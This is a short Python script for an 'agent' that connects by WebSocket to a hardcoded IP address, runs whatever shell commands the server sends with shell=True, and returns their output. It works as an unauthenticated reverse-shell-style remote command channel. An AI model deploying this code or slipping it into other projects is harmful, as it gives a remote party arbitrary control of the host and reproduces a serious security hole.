import asyncio
import websockets
import json
import subprocess

AGENT_ID = "agent-001"
CLOUD_SERVER_URL = "ws://13.58.212.239:8765"  # Cloud server WebSocket URL

async def agent():
    async with websockets.connect(CLOUD_SERVER_URL) as websocket:
        await websocket.send(AGENT_ID)
        print(f"Connected to cloud as {AGENT_ID}")
        while True:
            msg = await websocket.recv()
            command = json.loads(msg)
            print(f"Received command: {command}")
            # Execute command
            cmd_str = command.get("cmd", "echo 'No command'")
            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True)
            output = {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
            await websocket.send(json.dumps(output))
            print(f"Sent result: {output}")

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(agent())
